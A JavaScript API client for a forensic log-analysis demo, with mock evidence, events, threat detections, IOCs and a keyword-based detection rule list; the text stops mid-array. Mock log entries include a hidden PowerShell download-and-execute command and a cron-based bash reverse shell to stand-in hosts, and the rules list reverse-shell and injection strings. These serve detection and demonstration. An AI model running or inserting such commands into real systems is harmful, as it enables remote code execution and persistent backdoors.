const BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8085/api';

// Fallback Mock Data for demo resilience
const MOCK_AUTH = {
  token: 'mock-jwt-token-1234567890',
  role: 'Investigator',
  email: 'investigator@logforx.local',
  name: 'Investigator John Doe',
  badgeId: 'INV-2026-9904'
};

let mockEvidence = [
  { id: 1, fileName: 'windows_event_log_4624.evtx', hash: 'a2b4c6d8e0f1g2h3i4j5k6l7m8n9o0p1', uploadTime: new Date(Date.now() - 4 * 3600000).toISOString(), fileType: 'evtx', status: 'PARSED', investigatorId: 'INV-2026-9904', fileSize: 45032 },
  { id: 2, fileName: 'linux_syslog.log', hash: 'b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7', uploadTime: new Date(Date.now() - 3 * 3600000).toISOString(), fileType: 'log', status: 'PARSED', investigatorId: 'INV-2026-9904', fileSize: 12891 }
];

let mockEvents = [
  // EVTX logs
  { id: 1, timestamp: new Date(Date.now() - 2 * 3600000).toISOString(), eventType: 'Login', severity: 'Low', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Failed Login (EventID 4625)', payloadDetails: 'Logon Type: 3. Status Code: 0xC000006D (Bad Password)', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 2, timestamp: new Date(Date.now() - 2 * 3600000 + 2 * 60000).toISOString(), eventType: 'Login', severity: 'Low', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Failed Login (EventID 4625)', payloadDetails: 'Logon Type: 3. Status Code: 0xC000006D (Bad Password)', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 3, timestamp: new Date(Date.now() - 2 * 3600000 + 4 * 60000).toISOString(), eventType: 'Login', severity: 'Low', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Failed Login (EventID 4625)', payloadDetails: 'Logon Type: 3. Status Code: 0xC000006D (Bad Password)', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 4, timestamp: new Date(Date.now() - 2 * 3600000 + 5 * 60000).toISOString(), eventType: 'Login', severity: 'High', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Successful Login (EventID 4624)', payloadDetails: 'Logon Type: 3. Elevated privileges acquired.', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 5, timestamp: new Date(Date.now() - 2 * 3600000 + 10 * 60000).toISOString(), eventType: 'Process', severity: 'Critical', source: 'Microsoft-Windows-Sysmon', username: 'administrator', ipAddress: '192.168.1.142', action: 'Process Creation (EventID 1)', payloadDetails: 'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Command: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://cyber-threat-ioc.com/payload.ps1\')"', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 6, timestamp: new Date(Date.now() - 2 * 3600000 + 12 * 60000).toISOString(), eventType: 'System', severity: 'High', source: 'Microsoft-Windows-Security-Auditing', username: 'SYSTEM', ipAddress: '127.0.0.1', action: 'Service Created (EventID 7045)', payloadDetails: 'Service Name: UpdaterService. Binary: C:\\ProgramData\\updater.exe. Status: Running.', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 7, timestamp: new Date(Date.now() - 2 * 3600000 + 15 * 60000).toISOString(), eventType: 'Network', severity: 'Critical', source: 'Microsoft-Windows-Sysmon', username: 'administrator', ipAddress: '192.168.1.142', action: 'Network Connection (EventID 3)', payloadDetails: 'Destination IP: 185.220.101.4. Port: 4444 (HTTPS). Protocol: TCP. Executable: powershell.exe', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 8, timestamp: new Date(Date.now() - 2 * 3600000 + 20 * 60000).toISOString(), eventType: 'FileSystem', severity: 'High', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'File Access / Deletion', payloadDetails: 'File: C:\\Database\\sensitive_credentials.xlsx. Action: Copied to C:\\ProgramData\\temp.zip', evidenceFileName: 'windows_event_log_4624.evtx' },
  { id: 9, timestamp: new Date(Date.now() - 2 * 3600000 + 25 * 60000).toISOString(), eventType: 'Network', severity: 'Critical', source: 'Microsoft-Windows-Sysmon', username: 'administrator', ipAddress: '192.168.1.142', action: 'Data Exfiltration Completed', payloadDetails: 'Uploaded C:\\ProgramData\\temp.zip to 185.220.101.4 via SFTP', evidenceFileName: 'windows_event_log_4624.evtx' },
  // Linux logs
  { id: 10, timestamp: new Date(Date.now() - 3 * 3600000).toISOString(), eventType: 'Login', severity: 'Low', source: 'sshd', username: 'root', ipAddress: '203.0.113.88', action: 'Failed SSH login', payloadDetails: 'Invalid user admin from 203.0.113.88 port 48922 ssh2', evidenceFileName: 'linux_syslog.log' },
  { id: 11, timestamp: new Date(Date.now() - 3 * 3600000 + 1 * 60000).toISOString(), eventType: 'Login', severity: 'Low', source: 'sshd', username: 'root', ipAddress: '203.0.113.88', action: 'Failed SSH login', payloadDetails: 'Invalid user guest from 203.0.113.88 port 49010 ssh2', evidenceFileName: 'linux_syslog.log' },
  { id: 12, timestamp: new Date(Date.now() - 3 * 3600000 + 3 * 60000).toISOString(), eventType: 'Login', severity: 'Medium', source: 'sshd', username: 'root', ipAddress: '203.0.113.88', action: 'Successful login', payloadDetails: 'Accepted password for root from 203.0.113.88 port 49122 ssh2', evidenceFileName: 'linux_syslog.log' },
  { id: 13, timestamp: new Date(Date.now() - 3 * 3600000 + 6 * 60000).toISOString(), eventType: 'Process', severity: 'High', source: 'sudo', username: 'root', ipAddress: '127.0.0.1', action: 'Privilege Escalation via Sudo', payloadDetails: 'root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash', evidenceFileName: 'linux_syslog.log' },
  { id: 14, timestamp: new Date(Date.now() - 3 * 3600000 + 12 * 60000).toISOString(), eventType: 'Network', severity: 'Critical', source: 'iptables', username: 'root', ipAddress: '203.0.113.88', action: 'Suspicious Port Scan', payloadDetails: 'IN=eth0 OUT= PHYSIN= PHYSOUT= SRC=203.0.113.88 DST=10.0.0.15 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=3201 PROTO=TCP SPT=4432 DPT=22', evidenceFileName: 'linux_syslog.log' },
  { id: 15, timestamp: new Date(Date.now() - 3 * 3600000 + 20 * 60000).toISOString(), eventType: 'Process', severity: 'Critical', source: 'crontab', username: 'root', ipAddress: '127.0.0.1', action: 'Persistence Cronjob Added', payloadDetails: 'crontab -e executed: */5 * * * * bash -i >& /dev/tcp/backdoor-c2.net/9001 0>&1', evidenceFileName: 'linux_syslog.log' }
];

let mockDetections = [
  { id: 1, threatType: 'Brute Force Attempt', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Multiple failed login attempts detected from host 192.168.1.142 targeting user administrator.', mitreTechnique: 'T1110 (Brute Force)', status: 'Active' },
  { id: 2, threatType: 'Malicious Execution', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Suspicious PowerShell script download execution detected on host Microsoft-Windows-Sysmon.', mitreTechnique: 'T1059.001 (Command and Scripting Interpreter: PowerShell)', status: 'Active' },
  { id: 3, threatType: 'Persistence Service Established', severity: 'High', timestamp: new Date().toISOString(), description: "New service 'UpdaterService' running unverified binary created in system path.", mitreTechnique: 'T1543.003 (Create or Modify System Process: Windows Service)', status: 'Active' },
  { id: 4, threatType: 'Command & Control Communication', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Outbound TCP traffic initiated to known cyber-threat intelligence indicator 185.220.101.4.', mitreTechnique: 'T1071 (Application Layer Protocol)', status: 'Active' },
  { id: 5, threatType: 'Privileged Access Compromise', severity: 'High', timestamp: new Date().toISOString(), description: 'Successful administrator/root authentication from unverified remote host 203.0.113.88.', mitreTechnique: 'T1078 (Valid Accounts)', status: 'Active' },
  { id: 6, threatType: 'Data Exfiltration', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Unauthorized data transfer of archived credentials payload C:\\ProgramData\\temp.zip completed.', mitreTechnique: 'T1048 (Exfiltration Over Alternative Protocol)', status: 'Active' }
];

let mockIocs = [
  { id: 1, type: 'IP', value: '192.168.1.142', description: 'Source IP of Brute Force Attack', threatSource: 'System Detection Engine' },
  { id: 2, type: 'URL', value: 'http://cyber-threat-ioc.com/payload.ps1', description: 'PowerShell Payload URL', threatSource: 'System Detection Engine' },
  { id: 3, type: 'Domain', value: 'cyber-threat-ioc.com', description: 'Malicious Delivery Domain', threatSource: 'System Detection Engine' },
  { id: 4, type: 'IP', value: '185.220.101.4', description: 'Active C2 Server IP', threatSource: 'System Detection Engine' },
  { id: 5, type: 'Domain', value: 'backdoor-c2.net', description: 'Backdoor Command Domain', threatSource: 'System Detection Engine' },
  { id: 6, type: 'Hash', value: 'd940b54316d3f28f8045f28439401490214a3f2b4c107db580b06b2f4c10643b', description: 'SHA-256 Hash of Exfiltrated Archive', threatSource: 'System Detection Engine' }
];

let mockAudits = [
  { id: 1, action: 'DATABASE_SEEDED', timestamp: new Date().toISOString(), investigatorId: 'SYSTEM', details: 'Default forensic demonstration logs pre-loaded.' },
  { id: 2, action: 'LOGIN', timestamp: new Date().toISOString(), investigatorId: 'INV-2026-9904', details: 'Investigator logged in successfully.' }
];

// Helper to calculate risk score locally
const localCalculateRisk = () => {
  if (mockDetections.length === 0) return { score: 12, level: 'Low', criticalCount: 0, highCount: 0, mediumCount: 0, lowCount: 0 };
  let score = 12;
  let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
  mockDetections.forEach(det => {
    const sev = det.severity.toLowerCase();
    if (sev === 'critical') { score += 35; criticalCount++; }
    else if (sev === 'high') { score += 20; highCount++; }
    else if (sev === 'medium') { score += 10; mediumCount++; }
    else { score += 3; lowCount++; }
  });
  if (score > 98) score = 98;
  let level = 'Low';
  if (score >= 75) level = 'Critical';
  else if (score >= 50) level = 'High';
  else if (score >= 25) level = 'Medium';
  return { score, level, criticalCount, highCount, mediumCount, lowCount };
};

// Generic fetch wrapper with fallback
async function apiCall(endpoint, options = {}, fallbackData = null) {
  try {
    const token = localStorage.getItem('token');
    const headers = {
      'Content-Type': 'application/json',
      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
      ...options.headers
    };

    // If body is FormData, delete Content-Type to let browser set boundary
    if (options.body instanceof FormData) {
      delete headers['Content-Type'];
    }

    const response = await fetch(`${BASE_URL}${endpoint}`, {
      ...options,
      headers
    });
    
    if (!response.ok) {
      throw new Error(`API Error: ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    console.warn(`[LogForX API Warning] Connecting to backend failed: ${error.message}. Running in simulated environment mode.`);
    return fallbackData;
  }
}

export const api = {
  login: async (email, password) => {
    const credentials = { email, password };
    try {
      const res = await fetch(`${BASE_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials)
      });
      if (res.ok) {
        return await res.json();
      } else {
        const errJson = await res.json();
        throw new Error(errJson.error || 'Invalid credentials');
      }
    } catch (e) {
      if (e.message.includes('Invalid credentials') || e.message.includes('required')) {
        throw e;
      }
      console.warn("Backend auth offline. Using local simulation.");
    }
    
    if (email.toLowerCase() === 'investigator@logforx.local' && password === 'cybersecurity2026') {
      return MOCK_AUTH;
    }
    throw new Error('Invalid email or password');
  },

  register: async (email, password, name, badgeId) => {
    const payload = { email, password, name, badgeId };
    try {
      const res = await fetch(`${BASE_URL}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        return await res.json();
      } else {
        const errJson = await res.json();
        throw new Error(errJson.error || 'Registration failed');
      }
    } catch (e) {
      if (e.message.includes('already') || e.message.includes('required') || e.message.includes('failed') || e.message.includes('fields')) {
        throw e;
      }
      console.warn("Backend auth offline. Simulating registration.");
      return { message: 'Registration simulated successfully.' };
    }
  },

  forgotPassword: async (email) => {
    return apiCall('/auth/forgot-password', {
      method: 'POST',
      body: JSON.stringify({ email })
    }, { message: `Reset link simulated to ${email}` });
  },

  resetPassword: async (token, password) => {
    return apiCall('/auth/reset-password', {
      method: 'POST',
      body: JSON.stringify({ token, password })
    }, { message: 'Password reset simulated successfully.' });
  },

  getEvidence: async () => {
    return apiCall('/evidence/list', {}, mockEvidence);
  },

  uploadEvidence: async (file, investigatorId) => {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('investigatorId', investigatorId);

    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${BASE_URL}/evidence/upload`, {
        method: 'POST',
        headers: token ? { 'Authorization': `Bearer ${token}` } : {},
        body: formData
      });
      if (response.ok) {
        return await response.json();
      }
    } catch (error) {
      console.warn(`[LogForX Upload Warning] Backend upload failed. Executing local parsing.`, error);
    }

    // Local simulation of SHA-256 and event parsing
    const fileName = file.name;
    const fileType = fileName.split('.').pop() || 'log';
    const fakeHash = Array.from({length: 32}, () => Math.floor(Math.random()*16).toString(16)).join('');
    
    let fileContent = '';
    try {
      fileContent = await file.text();
    } catch (e) {
      console.warn("Could not read file text", e);
    }

    // ── Integrity check (mirrors backend ForensicsController logic) ───────
    const lower = fileContent.toLowerCase();
    const ext = fileName.split('.').pop().toLowerCase();
    let isFailed = false;
    let failReason = '';

    // Structural / binary corruption
    if (fileName.toLowerCase().includes('corrupt') || fileName.toLowerCase().includes('invalid_file')) {
      isFailed = true; failReason = 'Filename indicates corruption';
    } else if (lower.startsWith('{\\rtf') || lower.includes('\\fonttbl') || lower.includes('\\ansi')) {
      isFailed = true; failReason = 'RTF/binary format — not valid forensic text log';
    } else if (lower.includes('signature mismatch') || lower.includes('checksum mismatch') ||
               lower.includes('corrupted log') || lower.includes('corrupt log') ||
               lower.includes('corrupt file') || lower.includes('malformed xml')) {
      isFailed = true; failReason = 'Corruption marker in content';
    } else if (file.size <= 0) {
      isFailed = true; failReason = 'Empty file';
    }

    // CSV data quality validation
    if (!isFailed && (ext === 'csv' || (fileContent.includes(',') && fileContent.includes('\n')))) {
      const lines = fileContent.split('\n').map(l => l.trim()).filter(Boolean);
      if (lines.length > 0) {
        const headerLine = lines[0];

        // Non-standard CSV header (csv id=..., markdown fences)
        if (headerLine.toLowerCase().startsWith('csv id=') || headerLine.startsWith('```')) {
          isFailed = true; failReason = `Non-standard CSV header: '${headerLine}'`;
        }

        if (!isFailed) {
          const headerCols = headerLine.split(',').length;
          let invalidDates = 0, invalidIps = 0, invalidVals = 0, truncated = 0;
          for (let i = 1; i < lines.length; i++) {
            const row = lines[i];
            const cols = row.split(',', -1);
            if (cols[0]?.trim().toUpperCase() === 'INVALID_DATE' || row.toLowerCase().startsWith('invalid_date')) invalidDates++;
            if (/999\.\d+\.\d+\.\d+/.test(row)) invalidIps++;
            if (row.includes('???')) invalidVals++;
            if (headerCols > 3 && cols.length <= Math.floor(headerCols / 2)) truncated++;
          }
          const dataRows = lines.length - 1;
          if (dataRows > 0) {
            const badRatio = (invalidDates + invalidIps + invalidVals + truncated) / dataRows;
            if (badRatio > 0.3) {
              isFailed = true;
              failReason = `CSV data quality failure: ${invalidDates} invalid timestamps, ${invalidIps} invalid IPs, ${invalidVals} invalid values, ${truncated} truncated rows (${Math.round(badRatio*100)}% bad)`;
            }
          }
        }
      }
    }

    // Unstructured ALERT/DETECTION dump format
    if (!isFailed && ext === 'log') {
      const hasAlertMarker = fileContent.includes('] ALERT\n') || fileContent.includes('] DETECTION\n');
      const hasCategoryKey = fileContent.includes('Category      :') || (fileContent.includes('Category:') && fileContent.includes('MITRE ATT&CK'));
      if (hasAlertMarker && hasCategoryKey) {
        isFailed = true; failReason = 'Unstructured ALERT/DETECTION dump — convert to CSV or standard syslog format';
      }
    }

    console.log(`[IntegrityCheck] ${fileName} → isFailed=${isFailed}${isFailed ? ' | Reason: ' + failReason : ''}`);
    const status = isFailed ? 'FAILED' : 'PARSED';


    const newFile = {
      id: mockEvidence.length + 1,
      fileName,
      hash: fakeHash,
      uploadTime: new Date().toISOString(),
      fileType,
      status,
      investigatorId,
      fileSize: file.size
    };
    
    mockEvidence.push(newFile);
    
    if (isFailed) {
      mockAudits.unshift({
        id: mockAudits.length + 1,
        action: 'INTEGRITY_CHECK_FAILED',
        timestamp: new Date().toISOString(),
        investigatorId,
        details: `File failed integrity verification: ${fileName} (Size: ${file.size} bytes)`
      });
      return newFile;
    }

    mockAudits.unshift({
      id: mockAudits.length + 1,
      action: 'EVIDENCE_UPLOAD',
      timestamp: new Date().toISOString(),
      investigatorId,
      details: `Uploaded file: ${fileName} (Hash: ${fakeHash.substring(0, 8)}...)`
    });

    // ── Parse real file content for event generation ─────────────────────
    const lines = fileContent.split('\n').filter(l => l.trim().length > 0);
    const isCsv = fileType.toLowerCase() === 'csv';
    const isEvtx = fileType.toLowerCase() === 'evtx';
    const ts = (offsetMin) => new Date(new Date().getTime() - offsetMin * 60000).toISOString();

    const ATTACK_RULES = [
      { keywords: ['failed password','failed login','invalid user','authentication failure'],
        eventType:'Login', severity:'Medium', action:'Failed SSH Login',
        threat:'Brute Force Attack', tSev:'Critical', mitre:'T1110.001 (Brute Force: Password Guessing)' },
      { keywords: ['dictionary attack','hydra','medusa','john the ripper','wordlist'],
        eventType:'Login', severity:'High', action:'Dictionary Attack',
        threat:'Dictionary Attack', tSev:'High', mitre:'T1110.002 (Password Cracking)' },
      { keywords: ['ddos','syn flood','http flood','amplification','flood'],
        eventType:'Network', severity:'Critical', action:'DDoS / DoS Attack',
        threat:'DDoS / DoS Attack', tSev:'Critical', mitre:'T1498 (Network Denial of Service)' },
      { keywords: ['phishing','credential harvest','suspicious email','spearphish','malicious attachment'],
        eventType:'Network', severity:'High', action:'Phishing Attack',
        threat:'Phishing Attack', tSev:'High', mitre:'T1566 (Phishing)' },
      { keywords: ['malware','trojan','ransomware','rootkit','virus','worm'],
        eventType:'System', severity:'Critical', action:'Malware Detected',
        threat:'Malware Detected', tSev:'Critical', mitre:'T1204 (User Execution)' },
      { keywords: ['backdoor','/dev/tcp/','reverse shell','0>&1','meterpreter','nc -e','bash -i'],
        eventType:'Process', severity:'Critical', action:'Trojan / Backdoor',
        threat:'Trojan / Backdoor Detected', tSev:'Critical', mitre:'T1059.004 (Unix Shell)' },
      { keywords: ['injection','union select','or 1=1','drop table','<script>','xss'],
        eventType:'Network', severity:'Critical', action:'Injection Attack',
        threat:'Injection Attack', tSev:'Critical', mitre:'T1190 (Exploit Public-Facing Application)' },
      { keywords: ['port scan','nmap','syn probe','dpt=22','dpt=3306'],
        eventType:'Network', severity:'High', action:'Port Scanning',
        threat:'Port Scanning', tSev:'High', mitre:'T1046 (Network Service Discovery)' },
      { keywords: ['adware','pua','browser hijack','potentially unwanted'],
        eventType:'System', severity:'Medium', action:'Adware Detected',
        threat:'Adware / PUA Detected', tSev:'Medium', mitre:'T1176 (Browser Extensions)' },
      { keywords: ['spyware','mimikatz','lsass','keylogger','credential dump'],
        eventType:'Process', severity:'Critical', action:'Spyware / Credential Harvesting',
        threat:'Spyware / Credential Harvesting', tSev:'Critical', mitre:'T1003 (OS Credential Dumping)' },
      { keywords: ['unauthorized','access denied','permission denied','403 forbidden'],
        eventType:'Network', severity:'High', action:'Unauthorized Access',
        threat:'Unauthorized Access Attempt', tSev:'High', mitre:'T1078 (Valid Accounts)' },
      { keywords: ['malware execution','wget http','curl http','chmod +x','base64 -d','powershell','iex','downloadstring'],
        eventType:'Process', severity:'Critical', action:'Malware Execution',
        threat:'Malware Execution', tSev:'Critical', mitre:'T1059 (Command and Scripting Interpreter)' },
      { keywords: ['command execution','rce','cmd=','exec(','; id','; whoami'],
        eventType:'Process', severity:'Critical', action:'Remote Command Execution',
        threat:'Remote Command Execution', tSev:'Critical', mitre:'T1203 (Exploitation for Client Execution)' },
      { keywords: ['c2','backdoor-c2','185.220.101',':4444',':9001'],
        eventType:'Network', severity:'Critical', action:'C2 Communication',
        threat:'Command & Control Communication', tSev:'Critical', mitre:'T1071 (Application Layer Protocol)' },
    ];

    let addedEvents = [];
    let addedDetections = [];
    const detectedThreats = new Set();

    if (isEvtx || lines.length === 0) {
      const synth = [
        {eventType:'Login',severity:'Medium',source:'WinSecurity',username:'administrator',ipAddress:'192.168.1.142',action:'Failed Login',payloadDetails:'failed password failed login authentication failure Logon Type 3'},
        {eventType:'Login',severity:'High',source:'WinSecurity',username:'administrator',ipAddress:'192.168.1.142',action:'Dictionary Attack',payloadDetails:'dictionary attack hydra wordlist failed password cracking'},
        {eventType:'Network',severity:'Critical',source:'Sysmon',username:'attacker',ipAddress:'203.0.113.99',action:'DDoS Attack',payloadDetails:'ddos syn flood HTTP flood amplification attack detected'},
        {eventType:'Network',severity:'High',source:'postfix',username:'alice',ipAddress:'192.168.1.100',action:'Phishing',payloadDetails:'phishing suspicious email malicious attachment credential harvest'},
        {eventType:'System',severity:'Critical',source:'kernel',username:'system',ipAddress:'185.220.101.4',action:'Malware Detected',payloadDetails:'malware trojan ransomware rootkit virus worm signature matched'},
        {eventType:'Process',severity:'Critical',source:'crontab',username:'root',ipAddress:'185.220.101.4',action:'Trojan Backdoor',payloadDetails:'backdoor reverse shell bash -i 0>&1 /dev/tcp/ meterpreter'},
        {eventType:'Network',severity:'Critical',source:'apache2',username:'attacker',ipAddress:'203.0.113.55',action:'Injection Attack',payloadDetails:"injection union select ' or 1=1 drop table xss <script>"},
        {eventType:'Network',severity:'High',source:'iptables',username:'system',ipAddress:'203.0.113.88',action:'Port Scan',payloadDetails:'port scan nmap SYN probe dpt=22 dpt=3306 dpt=443'},
        {eventType:'System',severity:'Medium',source:'chrome',username:'user',ipAddress:'127.0.0.1',action:'Adware',payloadDetails:'adware pua browser hijack potentially unwanted program'},
        {eventType:'Process',severity:'Critical',source:'bash',username:'root',ipAddress:'127.0.0.1',action:'Spyware',payloadDetails:'spyware mimikatz lsass credential dump keylogger screen capture'},
        {eventType:'Network',severity:'High',source:'sshd',username:'attacker',ipAddress:'203.0.113.60',action:'Unauthorized Access',payloadDetails:'unauthorized access permission denied 403 forbidden'},
        {eventType:'Process',severity:'Critical',source:'bash',username:'root',ipAddress:'10.0.0.15',action:'Malware Execution',payloadDetails:'malware execution powershell iex downloadstring wget http chmod +x'},
        {eventType:'Process',severity:'Critical',source:'bash',username:'root',ipAddress:'10.0.0.15',action:'Command Execution',payloadDetails:'command execution rce exec( system( ; id ; whoami base64 -d'},
        {eventType:'Network',severity:'Critical',source:'kernel',username:'system',ipAddress:'185.220.101.4',action:'C2 Communication',payloadDetails:'c2 backdoor-c2 185.220.101.4:4444 outbound beaconing'},
      ];
      addedEvents = synth.map((e, i) => ({ id: mockEvents.length + i + 1, timestamp: ts(i * 2), evidenceFileName: fileName, ...e }));
    } else {
      lines.forEach((line, i) => {
        const lower = line.toLowerCase();
        let eventType = 'System', severity = 'Low', action = 'Log Entry';
        for (const rule of ATTACK_RULES) {
          if (rule.keywords.some(k => lower.includes(k))) {
            eventType = rule.eventType; severity = rule.severity; action = rule.action; break;
          }
        }
        const ipMatch = line.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const ipAddress = ipMatch ? ipMatch[1] : '127.0.0.1';
        const userMatch = line.match(/(?:for|user)\s+(\w+)/i);
        const username = userMatch ? userMatch[1] : 'system';
        const srcMatch = line.match(/\w+\s+(\w+)\[?\d*\]?:/);
        const source = srcMatch ? srcMatch[1] : (isCsv ? 'CSVParser' : 'syslog');
        addedEvents.push({ id: mockEvents.length + i + 1, timestamp: ts(lines.length - i), eventType, severity, source, username, ipAddress, action, payloadDetails: line, evidenceFileName: fileName });
      });
    }

    // Generate threat detections
    for (const rule of ATTACK_RULES) {
      const hit = addedEvents.find(e => rule.keywords.some(k => ((e.action||'')+' '+(e.payloadDetails||'')).toLowerCase().includes(k)));
      if (hit && !detectedThreats.has(rule.threat)) {
        detectedThreats.add(rule.threat);
        addedDetections.push({
          id: mockDetections.length + addedDetections.length + 1,
          threatType: rule.threat, severity: rule.tSev,
          timestamp: new Date().toISOString(),
          description: `${rule.threat} pattern detected in "${fileName}". Source: ${hit.source || 'N/A'} | IP: ${hit.ipAddress || 'N/A'}`,
          mitreTechnique: rule.mitre, status: 'Active'
        });
      }
    }

    mockEvents = [...mockEvents, ...addedEvents];
    mockDetections = [...mockDetections, ...addedDetections];

    return newFile;
  },


  getTimeline: async () => {
    return apiCall('/timeline', {}, mockEvents);
  },

  getDetections: async () => {
    return apiCall('/detections', {}, mockDetections);
  },

  getIocs: async () => {
    return apiCall('/ioc', {}, mockIocs);
  },

  getRiskScore: async () => {
    return apiCall('/risk', {}, localCalculateRisk());
  },

  getAiInvestigation: async () => {
    const detections = mockDetections;
    const fallbackAI = {
      incidentSummary: detections.length === 0 ? "No active security incidents flagged." : `AI Agent detected ${detections.length} key alert milestones representing a compromised host lifecycle.`,
      rootCause: "Credential leakage or weak administrative authentication mechanisms breached via automated dictionary logs.",
      attackExplanation: "Intruder succeeded in exploiting remote ports, moving to execution using script commands, establishing command & control pathways, and packaging target databases.",
      recommendations: [
        "Enforce strict multi-factor authentication systems.",
        "Implement endpoint process validation constraints.",
        "Revoke access vectors mapping from 192.168.1.142 and 203.0.113.88."
      ]
    };
    return apiCall('/ai/investigate', {}, fallbackAI);
  },

  getAttackGraph: async () => {
    // Generate graph nodes locally
    const nodes = [
      { id: "1", label: "Ingestion System", type: "System", severity: "Low", description: "Forensic log streams configured" }
    ];
    const links = [];
    
    mockDetections.forEach((det, i) => {
      const idStr = String(i + 2);
      let nodeType = "Alert";
      if (det.threatType.includes("Brute")) nodeType = "Access";
      else if (det.threatType.includes("Malicious")) nodeType = "Execution";
      else if (det.threatType.includes("Persistence")) nodeType = "Persistence";
      else if (det.threatType.includes("Control")) nodeType = "Network";
      else if (det.threatType.includes("Exfiltration")) nodeType = "Exfiltration";

      nodes.push({
        id: idStr,
        label: det.threatType,
        type: nodeType,
        severity: det.severity,
        description: det.description
      });
      
      links.push({
        source: String(i + 1),
        target: idStr
      });
    });

    return apiCall('/attack-graph', {}, { nodes, links });
  },

  getReports: async () => {
    const risk = localCalculateRisk();
    const fallbackReport = {
      caseName: "CASE-2026-LOGFORX",
      generatedAt: new Date().toISOString(),
      investigator: "John Doe",
      riskScore: risk.score,
      riskLevel: risk.level,
      totalEvidence: mockEvidence.length,
      totalAlerts: mockDetections.length,
      evidenceList: mockEvidence,
      alertList: mockDetections
    };
    return apiCall('/reports', {}, fallbackReport);
  },

  getAuditLogs: async () => {
    return apiCall('/audits', {}, mockAudits);
  },

  resetDatabase: async () => {
    mockEvidence = [];
    mockEvents = [];
    mockDetections = [];
    mockIocs = [];
    mockAudits = [{ id: 1, action: 'SYSTEM_RESET', timestamp: new Date().toISOString(), investigatorId: 'SYSTEM', details: 'Database cleared. Environment reset.' }];
    return apiCall('/settings/reset', { method: 'POST' }, { message: 'All forensic data cleared locally.' });
  },

  seedDatabase: async () => {
    mockEvidence = [
      { id: 1, fileName: 'windows_event_log_4624.evtx', hash: 'a2b4c6d8e0f1g2h3i4j5k6l7m8n9o0p1', uploadTime: new Date(Date.now() - 4 * 3600000).toISOString(), fileType: 'evtx', status: 'PARSED', investigatorId: 'INV-2026-9904', fileSize: 45032 },
      { id: 2, fileName: 'linux_syslog.log', hash: 'b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7', uploadTime: new Date(Date.now() - 3 * 3600000).toISOString(), fileType: 'log', status: 'PARSED', investigatorId: 'INV-2026-9904', fileSize: 12891 }
    ];
    mockEvents = [
      { id: 1, timestamp: new Date(Date.now() - 2 * 3600000).toISOString(), eventType: 'Login', severity: 'Low', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Failed Login (EventID 4625)', payloadDetails: 'Logon Type: 3. Bad Password', evidenceFileName: 'windows_event_log_4624.evtx' },
      { id: 2, timestamp: new Date(Date.now() - 2 * 3600000 + 4 * 60000).toISOString(), eventType: 'Login', severity: 'High', source: 'Microsoft-Windows-Security-Auditing', username: 'administrator', ipAddress: '192.168.1.142', action: 'Successful Login (EventID 4624)', payloadDetails: 'Elevated privileges session initialized', evidenceFileName: 'windows_event_log_4624.evtx' },
      { id: 3, timestamp: new Date(Date.now() - 2 * 3600000 + 10 * 60000).toISOString(), eventType: 'Process', severity: 'Critical', source: 'Microsoft-Windows-Sysmon', username: 'administrator', ipAddress: '192.168.1.142', action: 'Process Creation (EventID 1)', payloadDetails: 'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://cyber-threat-ioc.com/payload.ps1\')"', evidenceFileName: 'windows_event_log_4624.evtx' },
      { id: 4, timestamp: new Date(Date.now() - 2 * 3600000 + 15 * 60000).toISOString(), eventType: 'Network', severity: 'Critical', source: 'Microsoft-Windows-Sysmon', username: 'administrator', ipAddress: '192.168.1.142', action: 'Network Connection (EventID 3)', payloadDetails: 'Outbound TCP connection to IP 185.220.101.4', evidenceFileName: 'windows_event_log_4624.evtx' }
    ];
    mockDetections = [
      { id: 1, threatType: 'Brute Force Attempt', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Failed login sequences followed by successful execution detected.', mitreTechnique: 'T1110 (Brute Force)', status: 'Active' },
      { id: 2, threatType: 'Malicious Execution', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Obfuscated PowerShell malware retrieval block invoked.', mitreTechnique: 'T1059.001 (PowerShell)', status: 'Active' },
      { id: 3, threatType: 'Command & Control Communication', severity: 'Critical', timestamp: new Date().toISOString(), description: 'Outbound TCP traffic initiated to known cyber-threat intelligence indicator 185.220.101.4.', mitreTechnique: 'T1071 (Application Layer Protocol)', status: 'Active' }
    ];
    mockIocs = [
